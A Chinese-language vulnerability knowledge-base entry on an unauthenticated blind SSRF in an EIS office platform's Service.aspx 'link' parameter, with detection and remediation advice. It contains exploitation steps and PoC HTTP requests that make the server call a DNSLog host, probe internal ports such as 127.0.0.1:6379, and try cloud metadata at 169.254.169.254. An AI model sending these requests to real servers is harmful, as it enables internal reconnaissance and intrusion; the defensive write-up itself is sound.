---
id: web-generic-ssrf-eis-service-aspx-link-ssrf
title: EIS 办公平台 third/template Service.aspx：link 参数直拼 URL 导致前台盲 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: dotnet-webrequest-unvalidated-link-ssrf
tags:
- ssrf
- dotnet
- aspx
- webforms
- webrequest
- third-party
- oa
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:08:35+08:00'
  notes: 已对照原文与图10/11/12核对：web.config 的 third 目录 <allow users="*"/> 匿名放行；Service.cs 的 PostResponse 取 base.Request["link"]，拼成 "http://"+link+"/third/template/Install.aspx" 后 WebRequest.Create 发 POST，txt 参数为 body，超时 100000ms，均与图11一致；图12 Burp 请求 action=install + link=<ddns 域名>，DNSLog 收到 e574bfc220.ddns.bypass.eu.org 来自 59.37.178.66，盲 SSRF 成立。原文未演示内网响应读取/云元数据，卡内已标注盲 SSRF 边界；PoC 未本机执行。原文未给产品版本，未设置 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-eis-service-aspx-link-ssrf/
draft: false
kb_aliases:
- EIS SSRF
- 办公平台第三方集成 SSRF
- Service.aspx link 参数
- PostResponse SSRF
- WebRequest.Create 任意 URL
- 前台匿名 SSRF
---

## 一句话结论

某 EIS 办公平台的 `third/template/Service.aspx` 在 `action=install` 时调用 `PostResponse()`，把请求参数 `link` 直接拼进 `"http://" + link + "/third/template/Install.aspx"` 并交给 `WebRequest.Create` 发起 POST；`third` 目录在 `web.config` 中配置为 `<allow users="*" />` 匿名可访问，未登录攻击者即可让服务器访问任意主机/端口，形成前台盲 SSRF。

## 原理

- 入口：`bin/yard.UI.Integration/yard.UI.Integration.third.template/Service.cs` 的 `PostResponse` 方法，页面 `/third/template/Service.aspx?action=install` 可达。
- 取参：`string text = base.Request["link"];`，随后 `Uri requestUri = new Uri("http://" + text + "/third/template/Install.aspx");`，`WebRequest.Create(requestUri)`，`Method = "POST"`，把 `txt` 参数作为表单体发出去，超时 100000ms。
- 缺陷：`link` 未做任何校验——没有协议白名单、没有主机白名单、没有内网/回环地址过滤，也没有 `Uri` 解析后的二次校验。攻击者控制 `link` 就控制了目标主机与端口，固定后缀 `/third/template/Install.aspx` 只影响请求路径。
- 为什么匿名可达：站点 `web.config` 把 `third` 目录整体配置为允许所有用户（`<allow users="*" />`），该页面的授权检查因此被放行，不需要登录态。
- 危害：服务器侧发起请求，可探测内网主机/端口、访问仅内网可达的服务（管理后台、Redis/HTTP 管理面、云元数据端点等）。由于是盲请求，通常用 DNSLog/Collaborator 先确认出网，再按响应差异或带外通道扩展利用。本例固定 `http://` 协议，不能直接打 `file://`/`gopher://`，但主机和端口完全可控。

## 触发条件

- 目标 EIS 办公平台存在 `third/template/Service.aspx`，且 `third` 目录按默认配置匿名可访问。
- 请求能到达 `action=install` 分支并调用 `PostResponse()`。
- 服务器允许对外发起 HTTP 请求（出网或至少可达内网目标）。
- 盲 SSRF 需要攻击者具备 DNSLog/HTTP 回连等带外观测手段才能确认命中。

## 利用步骤

1. 准备一个 DNSLog 域名（如 `xxxx.dnslog.example`）。
2. 向 `/third/template/Service.aspx?action=install` 发送 POST，`link` 填 DNSLog 域名，`txt` 随便填。
3. 在 DNSLog 平台观察解析记录，确认服务器发起了请求，即 SSRF 成立。
4. 把 `link` 换成内网目标 `ip:port`（如 `192.168.1.10:8080`、`127.0.0.1:6379`），通过响应时间差、DNS 回连或后续带外通道探测内网服务。
5. 若目标网段存在云元数据服务，可尝试 `link=169.254.169.254`（注意固定后缀会追加到路径后，需结合目标对路径的容忍度判断是否可读到元数据）。

## PoC

```http
POST /third/template/Service.aspx?action=install HTTP/1.1
Host: target.example:8001
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

link=xxxx.dnslog.example&txt=test
```

```text
# 服务器实际发起：
POST http://xxxx.dnslog.example/third/template/Install.aspx
Body: txt=test
# 预期：DNSLog 收到来自目标服务器出口 IP 的解析记录。
```

内网探测变体：

```http
POST /third/template/Service.aspx?action=install HTTP/1.1
Host: target.example:8001
Content-Type: application/x-www-form-urlencoded

link=127.0.0.1:8080&txt=test
```

## 变体与关联

- 变体：`link` 传入 `host:port` 可做内网端口探测；若后端对 30x 跟随或回显响应，可升级为半回显 SSRF。
- 变体：固定后缀可被 `link` 中的 `#`、`?`、`@` 等 URL 语法影响，实际请求路径可能被改写，需按目标 URL 解析行为测试。
- 关联：[[web-generic-ssrf-configurable-push-url-blind]]（可配置推送 URL 的盲 SSRF）；[[web-generic-ssrf-cordyscrm-thirdparty-integration-url]]（第三方集成地址未校验）；[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]（OA 类系统 SSRF 弱黑名单）。
- 边界：本点为盲 SSRF，文章仅用 DNSLog 证明请求发出，未演示读取内网响应或云元数据；若目标不出网且无内网可达服务，危害有限。

## 检测与防御

- 检测：审计 `WebRequest.Create`/`HttpClient` 等出站请求点的参数来源；监控 `Service.aspx` 等集成页面对外发出的异常请求与 DNS 解析；关注 `link` 参数中出现 IP、内网域名、非预期端口的请求。
- 修复：对 `link` 使用 `Uri.TryCreate` 解析后做协议 + 主机白名单校验，禁止回环、内网、链路本地与云元数据地址；不要用字符串拼接构造 URL。
- 加固：出站请求走统一代理并做目的地 ACL；集成目录不应整体匿名放行，至少要求登录与权限校验；对固定后缀的集成回调地址改为配置项而非请求参数。
